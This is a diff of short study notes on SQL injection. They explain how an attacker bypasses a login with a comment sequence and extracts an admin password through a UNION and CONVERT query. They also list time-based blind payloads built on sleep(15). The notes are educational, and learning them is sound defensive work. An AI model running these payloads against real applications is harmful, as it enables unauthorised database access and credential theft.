@@ -1,26 +1,23 @@
 SQL Injection 
-A SQL injection is an attack in
-which the attacker executes arbitrary SQL
-commands on an application’s database by supplying
-malicious input inserted into a SQL statement.
+A SQL injection is an attack in which the attacker executes arbitrary SQL
+commands on an application’s database by supplying malicious input inserted into a SQL statement.
 
 Injecting Code into SQL Queries
 A SQL injection attack occurs when an attacker is able to inject code into the
 SQL statements that the target web application uses to access its database,
 thereby executing whatever SQL code the attacker wishes.
 
-SELECT Id FROM Users
-WHERE Username='admin';-- ' AND Password='password123';
-The -- sequence denotes the start of a SQL comment, which doesn’t get
-interpreted as code, so by adding -- into the username part of the query,
-the attacker effectively comments out the rest of the SQL query. The query
-becomes this:
-SELECT Id FROM Users WHERE Username='admin';
+Sample Queries
+SELECT id FROM users WHERE username='admin';-- ' AND Password='password123';
+The -- sequence denotes the start of a SQL comment, which doesn’t get interpreted as code, 
+so by adding -- into the username part of the query, the attacker effectively comments out the rest of the SQL query. 
+The query becomes this: SELECT id FROM users WHERE username='admin';
 
-SELECT Title, Body FROM Emails
-WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
+SELECT title, body FROM emails 
+WHERE username='vickie' 
+AND accesskey='ZB6w0YLjzvAVmp6zvr'
 UNION SELECT 1,
-CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE);--
+CONVERT((SELECT password FROM users WHERE username="admin"), DATE);--
 
 ' or sleep(15) and 1=1#
 ' or sleep(15)#
